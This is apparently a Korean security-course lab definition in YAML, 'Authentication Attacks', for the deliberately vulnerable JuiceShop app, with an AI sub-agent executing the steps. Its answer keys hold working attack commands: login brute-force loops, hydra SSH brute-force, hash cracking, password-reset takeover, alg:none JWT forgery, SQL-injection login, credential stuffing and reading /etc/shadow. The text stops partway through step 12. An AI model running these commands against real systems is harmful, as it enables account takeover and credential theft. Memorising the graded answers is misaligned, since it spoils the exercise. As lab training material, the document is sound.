lab_id: attack-ai-week05
title: 인증 공격 (Authentication Attacks) (AI 지원)
version: ai
course: attack-ai
week: 5
description: 비밀번호 브루트포스, 딕셔너리 공격, 크리덴셜 스터핑, JWT 조작 등 인증 메커니즘을 공격하는 기법을 실습한다. hydra,
  john, hashcat 등의 도구를 활용한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: medium
duration_minutes: 120
objectives:
- 온라인/오프라인 비밀번호 크래킹의 원리와 차이를 이해한다
- hydra를 사용한 웹 로그인 브루트포스를 수행할 수 있다
- JWT 토큰의 구조를 분석하고 약점을 공격할 수 있다
pass_threshold: 0.6
steps:
- order: 1
  instruction: JuiceShop의 사용자 목록 API(/api/Users)에서 이메일 주소를 수집하여 공격 대상 사용자 목록을 만들어라.
  hint: curl로 API를 호출하고 python3으로 이메일만 추출한다
  category: recon
  points: 10
  answer: curl -s http://10.20.30.80:3000/api/Users | python3 -c "import sys,json;
    [print(u['email']) for u in json.load(sys.stdin)['data']]" > /tmp/users.txt &&
    cat /tmp/users.txt
  answer_detail: 공격 대상 사용자 목록을 확보하는 것은 인증 공격의 첫 단계이다. API에서 사용자 정보가 노출되면 유효한 이메일/사용자명을
    수집하여 브루트포스 공격의 효율을 높일 수 있다.
  verify:
    type: output_contains
    expect: '@'
    field: stdout
  target_vm: attacker
  script: curl -s http://10.20.30.80:3000/api/Users | python3 -c "import sys,json;
    [print(u['email']) for u in json.load(sys.stdin)['data']]" > /tmp/users.txt &&
    cat /tmp/users.txt
  risk_level: low
  bastion_prompt: JuiceShop의 사용자 목록 API(/api/Users)에서 이메일 주소를 수집하여 공격 대상 사용자 목록을 만들어라해줘
- order: 2
  instruction: JuiceShop 로그인 API에 대해 일반적인 비밀번호 목록을 사용하여 수동 브루트포스를 시도하라. admin@juice-sh.op
    계정을 대상으로 하라.
  hint: for 루프와 curl을 조합하여 여러 비밀번호를 시도한다
  category: exploit
  points: 10
  answer: 'for pw in admin admin123 password 12345 admin1234; do echo -n "Trying:
    $pw -> "; curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
    application/json'' -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"$pw\"}"
    | python3 -c "import sys,json; d=json.load(sys.stdin); print(''SUCCESS'' if ''authentication''
    in d else ''FAIL'')"; done'
  answer_detail: 수동 브루트포스는 스크립팅을 통해 반복 로그인을 시도하는 기법이다. 실전에서는 계정 잠금, CAPTCHA, rate
    limiting 등의 방어 메커니즘이 있어 자동화 도구가 필요하다.
  verify:
    type: output_contains
    expect: Trying
    field: stdout
  target_vm: attacker
  script: 'for pw in admin admin123 password 12345 admin1234; do echo -n "Trying:
    $pw -> "; curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
    application/json'' -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"$pw\"}"
    | python3 -c "import sys,json; d=json.load(sys.stdin); print(''SUCCESS'' if ''authentication''
    in d else ''FAIL'')"; done'
  risk_level: medium
  bastion_prompt: JuiceShop 로그인 API에 대해 일반적인 비밀번호 목록을 사용하여 수동 브루트포스를 시도하라. admin@juice-sh.op
    계정을 대상으로 해줘
- order: 3
  instruction: hydra를 사용하여 SSH 서비스(10.20.30.80:22)에 대한 비밀번호 브루트포스를 시도하라. 사용자는 web,
    비밀번호 사전은 /usr/share/wordlists/rockyou.txt의 상위 100개를 사용하라.
  hint: hydra -l 사용자 -P 사전파일 ssh://타겟 형태로 실행한다
  category: exploit
  points: 10
  answer: head -100 /usr/share/wordlists/rockyou.txt > /tmp/top100.txt 2>/dev/null;
    hydra -l web -P /tmp/top100.txt ssh://10.20.30.80 -t 4 -f
  answer_detail: hydra는 다양한 프로토콜(SSH, HTTP, FTP, SMB 등)에 대한 온라인 브루트포스 도구이다. -t 옵션으로
    동시 스레드 수를 제어하고, -f 옵션으로 첫 성공 시 중단한다. SSH는 기본적으로 rate limiting이 있어 느리다.
  verify:
    type: output_contains
    expect: hydra
    field: stdout
  target_vm: attacker
  script: head -100 /usr/share/wordlists/rockyou.txt > /tmp/top100.txt 2>/dev/null;
    hydra -l web -P /tmp/top100.txt ssh://10.20.30.80 -t 4 -f
  risk_level: medium
  bastion_prompt: hydra를 사용하여 SSH 서비스(10.20.30.80:22)에 대한 비밀번호 브루트포스를 시도해줘
- order: 4
  instruction: John the Ripper를 사용하여 MD5 해시를 크래킹하라. 먼저 echo -n 'admin123' | md5sum으로
    해시를 생성하고, john으로 복원하라.
  hint: 해시를 파일에 저장하고 john --format=raw-md5로 크래킹한다
  category: exploit
  points: 10
  answer: echo -n 'admin123' | md5sum | awk '{print $1}' > /tmp/hash.txt && john --format=raw-md5
    --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash.txt 2>/dev/null; john --format=raw-md5
    --show /tmp/hash.txt
  answer_detail: 오프라인 비밀번호 크래킹은 해시 값을 확보한 후 원문을 복원하는 기법이다. MD5는 더 이상 안전하지 않은 해시 알고리즘으로,
    rainbow table이나 사전 공격으로 빠르게 크래킹된다.
  verify:
    type: output_contains
    expect: admin123
    field: stdout
  target_vm: attacker
  script: echo -n 'admin123' | md5sum | awk '{print $1}' > /tmp/hash.txt && john --format=raw-md5
    --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash.txt 2>/dev/null; john --format=raw-md5
    --show /tmp/hash.txt
  risk_level: medium
  bastion_prompt: John the Ripper를 사용하여 MD5 해시를 크래킹해줘
- order: 5
  instruction: JuiceShop의 비밀번호 재설정 기능(/rest/user/reset-password)을 사용하여 보안 질문 답변 브루트포스를
    시도하라. admin@juice-sh.op 계정을 대상으로 하라.
  hint: 보안 질문의 답변을 추측하여 비밀번호를 재설정한다
  category: exploit
  points: 10
  answer: 'for ans in ''replicator'' ''Mr. Robot'' ''Jim'' ''Samuel''; do echo -n
    "Answer: $ans -> "; curl -s -X POST http://10.20.30.80:3000/rest/user/reset-password
    -H ''Content-Type: application/json'' -d "{\"email\":\"admin@juice-sh.op\",\"answer\":\"$ans\",\"new\":\"hacked123\",\"repeat\":\"hacked123\"}"
    | head -c 100; echo; done'
  answer_detail: 보안 질문 기반 비밀번호 재설정은 추측 가능한 답변으로 인해 취약하다. OSINT로 수집한 정보(SNS, 블로그 등)를
    활용하면 보안 질문의 답변을 추측할 수 있다.
  verify:
    type: output_contains
    expect: 'Answer:'
    field: stdout
  target_vm: attacker
  script: 'for ans in ''replicator'' ''Mr. Robot'' ''Jim'' ''Samuel''; do echo -n
    "Answer: $ans -> "; curl -s -X POST http://10.20.30.80:3000/rest/user/reset-password
    -H ''Content-Type: application/json'' -d "{\"email\":\"admin@juice-sh.op\",\"answer\":\"$ans\",\"new\":\"hacked123\",\"repeat\":\"hacked123\"}"
    | head -c 100; echo; done'
  risk_level: medium
  bastion_prompt: JuiceShop의 비밀번호 재설정 기능(/rest/user/reset-password)을 사용하여 보안 질문 답변
    브루트포스를 시도하라. admin@juice-sh.op 계정을 대상으로 해줘
- order: 6
  instruction: JWT 토큰의 알고리즘을 'none'으로 변경하여 서명 검증을 우회하라. python3으로 조작된 JWT를 생성하라.
  hint: JWT header의 alg를 none으로 변경하고 signature 부분을 제거한다
  category: exploit
  points: 15
  answer: python3 -c "import base64,json; h=base64.urlsafe_b64encode(json.dumps({'typ':'JWT','alg':'none'}).encode()).rstrip(b'=').decode();
    p=base64.urlsafe_b64encode(json.dumps({'status':'success','data':{'id':1,'email':'admin@juice-sh.op','role':'admin'},'iat':1700000000}).encode()).rstrip(b'=').decode();
    print(f'{h}.{p}.')"
  answer_detail: JWT의 'none' 알고리즘 공격은 서버가 알고리즘 필드를 클라이언트에서 받아들일 때 가능하다. alg:none으로
    설정하면 서명 검증이 생략되어 페이로드를 자유롭게 조작할 수 있다. 현대 JWT 라이브러리는 이를 차단한다.
  verify:
    type: output_contains
    expect: none
    field: stdout
  target_vm: attacker
  script: python3 -c "import base64,json; h=base64.urlsafe_b64encode(json.dumps({'typ':'JWT','alg':'none'}).encode()).rstrip(b'=').decode();
    p=base64.urlsafe_b64encode(json.dumps({'status':'success','data':{'id':1,'email':'admin@juice-sh.op','role':'admin'},'iat':1700000000}).encode()).rstrip(b'=').decode();
    print(f'{h}.{p}.')"
  risk_level: medium
  bastion_prompt: JWT 토큰의 알고리즘을 'none'으로 변경하여 서명 검증을 우회하라. python3으로 조작된 JWT를 생성해줘
- order: 7
  instruction: hashcat을 사용하여 SHA-256 해시를 크래킹하라. echo -n 'password' | sha256sum으로 해시를
    생성하고 복원하라.
  hint: hashcat -m 1400 옵션이 raw SHA-256이다
  category: exploit
  points: 10
  answer: 'echo -n ''password'' | sha256sum | awk ''{print $1}'' > /tmp/sha256.txt
    && hashcat -m 1400 /tmp/sha256.txt /usr/share/wordlists/rockyou.txt --force 2>/dev/null
    | tail -5; echo ''Hash: ''$(cat /tmp/sha256.txt)'
  answer_detail: hashcat은 GPU 가속을 지원하는 고성능 해시 크래킹 도구이다. -m 옵션으로 해시 타입을 지정한다(0=MD5,
    100=SHA-1, 1400=SHA-256). GPU가 있으면 CPU 대비 수십~수백 배 빠른 크래킹이 가능하다.
  verify:
    type: output_contains
    expect: 'Hash:'
    field: stdout
  target_vm: attacker
  script: 'echo -n ''password'' | sha256sum | awk ''{print $1}'' > /tmp/sha256.txt
    && hashcat -m 1400 /tmp/sha256.txt /usr/share/wordlists/rockyou.txt --force 2>/dev/null
    | tail -5; echo ''Hash: ''$(cat /tmp/sha256.txt)'
  risk_level: medium
  bastion_prompt: hashcat을 사용하여 SHA-256 해시를 크래킹하라. echo -n 'password' | sha256sum으로
    해시를 생성하고 복원해줘
- order: 8
  instruction: JuiceShop에 새 사용자를 등록하고, 로그인하여 받은 JWT 토큰에서 비밀 키(secret)를 추측하라. jwt 크래킹
    도구나 수동 방법을 사용하라.
  hint: '일반적인 JWT 비밀 키 후보: secret, 1234, password 등을 시도한다'
  category: exploit
  points: 10
  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
    application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c
    "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
    && python3 -c "import hmac,hashlib,base64,sys; t=''$TOKEN''; parts=t.split(''.'');
    header_payload=parts[0]+''.''+parts[1]; sig=parts[2]; secrets=[''secret'',''1234'',''password'',''jwt_secret'',''key''];
    [print(f''Key: {s} -> Match: {base64.urlsafe_b64encode(hmac.new(s.encode(),header_payload.encode(),hashlib.sha256).digest()).rstrip(b"=").decode()==sig}'')
    for s in secrets]"'
  answer_detail: JWT의 HMAC 서명 키가 약한 비밀번호이면 브루트포스로 키를 복원할 수 있다. 키를 알면 임의의 페이로드로 유효한
    JWT를 생성하여 다른 사용자를 사칭할 수 있다.
  verify:
    type: output_contains
    expect: 'Key:'
    field: stdout
  target_vm: attacker
  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
    application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c
    "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
    && python3 -c "import hmac,hashlib,base64,sys; t=''$TOKEN''; parts=t.split(''.'');
    header_payload=parts[0]+''.''+parts[1]; sig=parts[2]; secrets=[''secret'',''1234'',''password'',''jwt_secret'',''key''];
    [print(f''Key: {s} -> Match: {base64.urlsafe_b64encode(hmac.new(s.encode(),header_payload.encode(),hashlib.sha256).digest()).rstrip(b"=").decode()==sig}'')
    for s in secrets]"'
  risk_level: medium
  bastion_prompt: JuiceShop에 새 사용자를 등록하고, 로그인하여 받은 JWT 토큰에서 비밀 키(secret)를 추측하라. jwt
    크래킹 도구나 수동 방법을 사용해줘
- order: 9
  instruction: SSH 키 기반 인증의 보안 이점을 확인하기 위해, ssh-keygen으로 ED25519 키 쌍을 생성하라.
  hint: ssh-keygen -t ed25519 옵션을 사용한다
  category: analysis
  points: 10
  answer: ssh-keygen -t ed25519 -f /tmp/test_key -N '' -q && echo 'Public Key:' &&
    cat /tmp/test_key.pub && echo 'Key fingerprint:' && ssh-keygen -lf /tmp/test_key
  answer_detail: SSH 키 기반 인증은 비밀번호 브루트포스에 면역이다. ED25519는 256비트 타원곡선 기반으로 RSA보다 짧은
    키 길이에서 동등한 보안 강도를 제공한다.
  verify:
    type: output_contains
    expect:
    - 'Public Key:'
    - ED25519
    field: stdout
  target_vm: attacker
  script: ssh-keygen -t ed25519 -f /tmp/test_key -N '' -q && echo 'Public Key:' &&
    cat /tmp/test_key.pub && echo 'Key fingerprint:' && ssh-keygen -lf /tmp/test_key
  risk_level: low
  bastion_prompt: SSH 키 기반 인증의 보안 이점을 확인하기 위해, ssh-keygen으로 ED25519 키 쌍을 생성해줘
- order: 10
  instruction: 크리덴셜 스터핑을 시뮬레이션하라. 여러 사용자/비밀번호 조합을 파일에 저장하고 JuiceShop 로그인 API에 자동 시도하라.
  hint: 사용자:비밀번호 형태의 파일을 만들고 while read 루프로 시도한다
  category: exploit
  points: 10
  answer: 'echo -e ''admin@juice-sh.op:admin123\njim@juice-sh.op:ncc-1701\nbender@juice-sh.op:bender\nmc.safesearch@juice-sh.op:Mr.
    N00dles'' > /tmp/creds.txt && while IFS=: read -r email pw; do echo -n "$email
    -> "; curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
    application/json'' -d "{\"email\":\"$email\",\"password\":\"$pw\"}" | python3
    -c "import sys,json; d=json.load(sys.stdin); print(''SUCCESS'' if ''authentication''
    in d else ''FAIL'')" 2>/dev/null; done < /tmp/creds.txt'
  answer_detail: 크리덴셜 스터핑은 다른 사이트에서 유출된 사용자명/비밀번호 조합을 대상 서비스에 자동으로 시도하는 공격이다. 비밀번호
    재사용이 많은 환경에서 높은 성공률을 보인다.
  verify:
    type: output_contains
    expect: ->
    field: stdout
  target_vm: attacker
  script: 'echo -e ''admin@juice-sh.op:admin123\njim@juice-sh.op:ncc-1701\nbender@juice-sh.op:bender\nmc.safesearch@juice-sh.op:Mr.
    N00dles'' > /tmp/creds.txt && while IFS=: read -r email pw; do echo -n "$email
    -> "; curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
    application/json'' -d "{\"email\":\"$email\",\"password\":\"$pw\"}" | python3
    -c "import sys,json; d=json.load(sys.stdin); print(''SUCCESS'' if ''authentication''
    in d else ''FAIL'')" 2>/dev/null; done < /tmp/creds.txt'
  risk_level: medium
  bastion_prompt: 크리덴셜 스터핑을 시뮬레이션해줘
- order: 11
  instruction: /etc/shadow 파일의 해시 형식을 분석하라. 로컬 시스템의 /etc/shadow에서 해시 알고리즘과 salt를 식별하라.
  hint: sudo cat /etc/shadow로 해시를 확인하고 $id$ 형식을 분석한다
  category: analysis
  points: 10
  answer: 'sudo cat /etc/shadow | grep -v ''!'' | grep -v ''*'' | head -5 | while
    read line; do user=$(echo $line | cut -d: -f1); hash=$(echo $line | cut -d: -f2);
    algo=$(echo $hash | cut -d''$'' -f2); echo "User: $user, Algorithm: $algo"; done'
  answer_detail: '/etc/shadow의 해시 형식은 $id$salt$hash이다. id 값으로 알고리즘을 식별한다: 1=MD5, 5=SHA-256,
    6=SHA-512, y=yescrypt. 현대 리눅스는 SHA-512 또는 yescrypt를 기본 사용한다.'
  verify:
    type: output_contains
    expect: 'User:'
    field: stdout
  target_vm: attacker
  script: 'sudo cat /etc/shadow | grep -v ''!'' | grep -v ''*'' | head -5 | while
    read line; do user=$(echo $line | cut -d: -f1); hash=$(echo $line | cut -d: -f2);
    algo=$(echo $hash | cut -d''$'' -f2); echo "User: $user, Algorithm: $algo"; done'
  risk_level: low
  bastion_prompt: /etc/shadow 파일의 해시 형식을 분석해줘
- order: 12
  instruction: pass-the-hash 개념을 이해하기 위해 NTLM 해시를 생성하라. python3으로 'password'의 NTLM
    해시를 계산하라.
  hint: NTLM 해시는 MD4(UTF-16LE(password))이다
  category: analysis
  points: 10
  answer: python3 -c "import hashlib; print('NTLM hash of password:', hashlib.new('md4',
    'password'.encode('utf-16-le')).hexdigest())"
  answer_detail: NTLM 해시는 Windows 인증에 사용되며, MD4(UTF-16LE(password))로 계산된다. Pass-the-Hash
